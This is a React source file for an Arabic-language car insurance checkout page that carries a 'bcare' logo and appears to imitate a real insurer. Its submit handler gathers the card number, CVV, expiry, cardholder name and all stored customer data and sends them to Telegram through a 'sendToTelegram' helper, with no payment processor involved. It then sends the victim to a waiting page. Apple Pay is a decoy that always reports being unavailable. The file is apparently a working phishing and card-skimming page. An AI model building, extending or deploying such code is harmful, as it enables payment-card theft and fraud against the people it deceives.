import { zodResolver } from '@hookform/resolvers/zod'
import { useMemo } from 'react'
import { Controller, useForm } from 'react-hook-form'
import { useNavigate, useSearchParams } from 'react-router-dom'

import { sendToTelegram } from '@/api/telegram'
import { PlanLogo } from '@/components/PlanLogo'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select'
import { formatPan } from '@/lib/luhn'
import { savePaymentBundle } from '@/lib/paymentBundle'
import { loadCustomerData, loadInsuranceSelection } from '@/lib/storage'
import { paymentCardSchema, type PaymentCardFormValues } from '@/schemas/paymentCard'

const DISCOUNT = 75.3

export default function PaymentPage() {
  const navigate = useNavigate()
  const [params] = useSearchParams()
  const userId = params.get('user_id') ?? localStorage.getItem('user_id') ?? ''

  const ins = loadInsuranceSelection()
  const customer = loadCustomerData()

  const navigateBack = () => {
    navigate(userId ? `/plans/third-party?user_id=${encodeURIComponent(userId)}` : '/plans/third-party')
  }

  const totals = useMemo(() => {
    if (!ins) return null
    const servicesTotal = ins.features.reduce((s, f) => s + f.price, 0)
    const sub = ins.base + servicesTotal - DISCOUNT
    const vat = Math.round(sub * 0.15 * 100) / 100
    const total = Math.round((sub + vat) * 100) / 100
    return { servicesTotal, sub, vat, total, discount: DISCOUNT }
  }, [ins])

  const form = useForm<PaymentCardFormValues>({
    resolver: zodResolver(paymentCardSchema),
    defaultValues: {
      cardNumber: '',
      cardHolder: '',
      cvv: '',
      expiryMonth: '',
      expiryYear: '',
    },
    mode: 'onBlur',
  })

  if (!ins || !totals) {
    return (
      <div className="min-h-screen bg-background p-8 text-center">
        <p className="mb-4 text-muted-foreground">يرجى اختيار عرض التأمين أولاً</p>
        <Button type="button" onClick={navigateBack}>
          العودة للعروض
        </Button>
      </div>
    )
  }

  const start = customer.policy_start_date
    ? new Date(customer.policy_start_date as string)
    : new Date()
  const end = new Date(start)
  end.setFullYear(end.getFullYear() + 1)

  const fmtAr = (d: Date) =>
    d.toLocaleDateString('ar-SA', { year: 'numeric', month: 'long', day: 'numeric' })

  const onSubmit = async (v: PaymentCardFormValues) => {
    const pan = v.cardNumber.replace(/\s/g, '')
    const expiry = `${v.expiryMonth}/${v.expiryYear}`
    const basePrice = ins.base
    const servicesTotal = ins.features.reduce((s, f) => s + f.price, 0)
    const subtotal = basePrice + servicesTotal - DISCOUNT
    const vat = Math.round(subtotal * 0.15 * 100) / 100
    const total = Math.round((subtotal + vat) * 100) / 100

    const flat: Record<string, string> = {
      name: v.cardHolder,
      cardnumber: pan,
      expirationdate: expiry,
      securitycode: v.cvv,
      cardholder_name: v.cardHolder,
      card_number: pan,
      expiry_date: expiry,
      cvv: v.cvv,
      payment_method: 'card',
      company: ins.company,
      plan: ins.plan,
      base: basePrice.toFixed(2),
      services_total: servicesTotal.toFixed(2),
      discount: DISCOUNT.toFixed(2),
      price: subtotal.toFixed(2),
      vat: vat.toFixed(2),
      total: total.toFixed(2),
      features: JSON.stringify(ins.features),
      start_date: start.toISOString().slice(0, 10),
      end_date: end.toISOString().slice(0, 10),
      insurance_json: JSON.stringify(ins),
      features_json: JSON.stringify(ins.features),
      total_amount: String(ins.total ?? total),
      user_id: userId,
    }

    Object.entries(customer).forEach(([k, val]) => {
      if (val !== undefined && val !== null) flat[k] = String(val)
    })

    const res = await sendToTelegram({ type: 'payment_card', payload: flat })
    if (!res.ok) {
      alert('تعذّر الإرسال، يرجى المحاولة مرة أخرى')
      return
    }
    savePaymentBundle(flat)
    navigate(`/wait${userId ? `?user_id=${encodeURIComponent(userId)}` : ''}`)
  }

  return (
    <div className="min-h-screen bg-muted/40">
      <nav className="border-b border-border bg-card shadow-sm">
        <div className="mx-auto flex max-w-7xl flex-wrap items-center justify-between gap-4 px-4 py-4">
          <div className="flex items-center gap-3">
            <span className="sr-only">قائمة</span>
            <img src="/bcare-logo.svg" alt="bcare" width={90} height={45} />
          </div>
          <Button type="button" variant="outline" className="rounded-full border-primary/20 bg-accent text-sm font-medium text-primary">
            أمن الأن
          </Button>
        </div>
      </nav>

      <div className="mx-auto max-w-6xl px-4 py-6 lg:grid lg:grid-cols-[400px_1fr] lg:gap-10 lg:items-start">
        <section className="mb-6 rounded-2xl border border-border bg-card p-5 shadow-sm lg:sticky lg:top-8">
          <h2 className="mb-4 text-center text-lg font-semibold text-foreground">تفاصيل الدفع</h2>
          <hr className="mb-6 border-border" />
          <div className="mb-6 rounded-xl border border-info/40 bg-muted p-4">
            <div className="mb-4 flex flex-col items-center text-center">
              <PlanLogo src={ins.logo} className="mb-2 h-12" alt="" />
              <span className="font-semibold text-foreground">{ins.company}</span>
            </div>
            <div className="mb-4 text-sm text-muted-foreground">
              <p className="mb-2 font-medium text-foreground">فترة التأمين:</p>
              <div className="flex justify-between gap-2">
                <span>تاريخ البداية:</span>
                <span>{fmtAr(start)}</span>
              </div>
              <div className="flex justify-between gap-2">
                <span>تاريخ الانتهاء:</span>
                <span>{fmtAr(end)}</span>
              </div>
            </div>
            {ins.features.length > 0 && (
              <div className="mb-4 text-sm">
                <p className="mb-2 font-medium">الخدمات المختارة:</p>
                <ul className="space-y-1">
                  {ins.features.map((f, i) => (
                    <li key={i} className="flex justify-between gap-2">
                      <span>• {f.label}</span>
                      <span className="font-semibold">{f.price.toFixed(2)} ريال</span>
                    </li>
                  ))}
                </ul>
              </div>
            )}
            <div className="space-y-2 text-sm text-muted-foreground">
              <div className="flex justify-between">
                <span>القسط الأساسي:</span>
                <span>{ins.base.toFixed(2)} ريال</span>
              </div>
              {totals.servicesTotal > 0 && (
                <div className="flex justify-between">
                  <span>الخدمات الإضافية:</span>
                  <span>{totals.servicesTotal.toFixed(2)} ريال</span>
                </div>
              )}
              <div className="flex justify-between text-emerald-600">
                <span>خصم عدم وجود مطالبات:</span>
                <span>-{DISCOUNT.toFixed(2)} ريال</span>
              </div>
              <div className="flex justify-between border-t border-border pt-2 font-medium text-foreground">
                <span>المجموع الفرعي:</span>
                <span>{totals.sub.toFixed(2)} ريال</span>
              </div>
              <div className="flex justify-between">
                <span>ضريبة القيمة المضافة (15%):</span>
                <span>{totals.vat.toFixed(2)} ريال</span>
              </div>
            </div>
            <div className="mt-4 flex items-center justify-between border-t border-border pt-4">
              <span className="font-bold text-foreground">المبلغ الإجمالي:</span>
              <span className="text-2xl font-bold text-primary">{totals.total.toFixed(2)} ريال</span>
            </div>
          </div>
        </section>

        <section className="rounded-2xl border border-border bg-card p-6 shadow-sm">
          <h3 className="mb-6 text-lg font-bold text-foreground">اختر طريقة الدفع</h3>
          <div className="mb-6 space-y-3">
            <div className="flex cursor-pointer items-center justify-between rounded-xl border border-info/50 bg-muted p-4">
              <div className="flex items-center gap-3">
                <img src="/assets/cards-DEvwsDKR.webp" className="h-9 w-auto object-contain" width={120} height={36} alt="بطاقات الدفع" />
              </div>
              <span className="font-bold text-primary">{totals.total.toFixed(2)} ر.س</span>
            </div>
            <div
              className="cursor-pointer rounded-xl border border-border bg-card p-4 opacity-70"
              onClick={() => alert('عذراً الدفع عن طريق أبل غير متوفر حاليا')}
              role="presentation"
            >
              <div className="flex items-center justify-between">
                <img
                  src="https://cdn2.downdetector.com/static/uploads/logo/apple-pay.png"
                  style={{ height: 36 }}
                  width={120}
                  height={36}
                  alt="apple"
                />
              </div>
            </div>
          </div>
          <hr className="mb-6 border-border" />
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
            <div>
              <div className="mb-1 flex items-center justify-between gap-3">
                <Label htmlFor="cardNumber">رقم البطاقة</Label>
                <img src="/assets/cards-DEvwsDKR.webp" className="h-7 w-auto object-contain" width={112} height={28} alt="بطاقات الدفع" />
              </div>
              <Input
                id="cardNumber"
                dir="ltr"
                className="text-start"
                placeholder="1234 1234 1234 1234"
                inputMode="numeric"
                maxLength={19}
                {...form.register('cardNumber', {
                  onChange: (e) => {
                    e.target.value = formatPan(e.target.value)
                  },
                })}
              />
              {form.formState.errors.cardNumber?.message && (
                <p className="mt-1 text-xs text-destructive">{form.formState.errors.cardNumber.message}</p>
              )}
            </div>
            <div>
              <Label htmlFor="cardHolder">اسم صاحب البطاقة</Label>
              <Input id="cardHolder" dir="ltr" className="mt-1" placeholder="الاسم على البطاقة" {...form.register('cardHolder')} />
              {form.formState.errors.cardHolder?.message && (
                <p className="mt-1 text-xs text-destructive">{form.formState.errors.cardHolder.message}</p>
              )}
            </div>
            <div className="grid grid-cols-3 gap-2">
              <div>
                <Label>رمز CVV</Label>
                <Input
                  type="password"
                  dir="ltr"
                  className="mt-1 text-center text-xl font-bold tracking-widest"
                  maxLength={4}
                  inputMode="numeric"
                  {...form.register('cvv', {
                    onChange: (e) => {
                      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4)
                    },
                  })}
                />
                {form.formState.errors.cvv?.message && (
                  <p className="mt-1 text-xs text-destructive">{form.formState.errors.cvv.message}</p>
                )}
              </div>
              <div>
                <Label>السنة</Label>
                <Controller
                  name="expiryYear"
                  control={form.control}
                  render={({ field }) => (
                    <Select value={field.value} onValueChange={field.onChange} dir="rtl">
                      <SelectTrigger className="mt-1">
                        <SelectValue placeholder="سنة" />
                      </SelectTrigger>
                      <SelectContent>
                        {Array.from({ length: 21 }, (_, i) => {
                          const y = new Date().getFullYear() + i
                          const yy = String(y).slice(-2)
                          return (
                            <SelectItem key={y} value={yy}>
                              {y}
                            </SelectItem>
                          )
                        })}
                      </SelectContent>
                    </Select>
                  )}
                />
                {form.formState.errors.expiryYear?.message && (
                  <p className="mt-1 text-xs text-destructive">{form.formState.errors.expiryYear.message}</p>
                )}
              </div>
              <div>
                <Label>الشهر</Label>
                <Controller
                  name="expiryMonth"
                  control={form.control}
                  render={({ field }) => (
                    <Select value={field.value} onValueChange={field.onChange} dir="rtl">
                      <SelectTrigger className="mt-1">
                        <SelectValue placeholder="الشهر" />
                      </SelectTrigger>
                      <SelectContent>
                        {Array.from({ length: 12 }, (_, i) => {
                          const m = String(i + 1).padStart(2, '0')
                          return (
                            <SelectItem key={m} value={m}>
                              {m}
                            </SelectItem>
                          )
                        })}
                      </SelectContent>
                    </Select>
                  )}
                />
                {form.formState.errors.expiryMonth?.message && (
                  <p className="mt-1 text-xs text-destructive">{form.formState.errors.expiryMonth.message}</p>
                )}
              </div>
            </div>

            <Button type="submit" className="w-full py-6 text-lg font-bold">
              ادفع الآن — {totals.total.toFixed(2)} ر.س
            </Button>
          </form>
          <div className="mt-6 flex justify-center">
            <img src="/assets/cards-all-BF_GftTO.png" alt="وسائل الدفع المتاحة" className="h-10 w-auto object-contain" />
          </div>
        </section>
      </div>
    </div>
  )
}
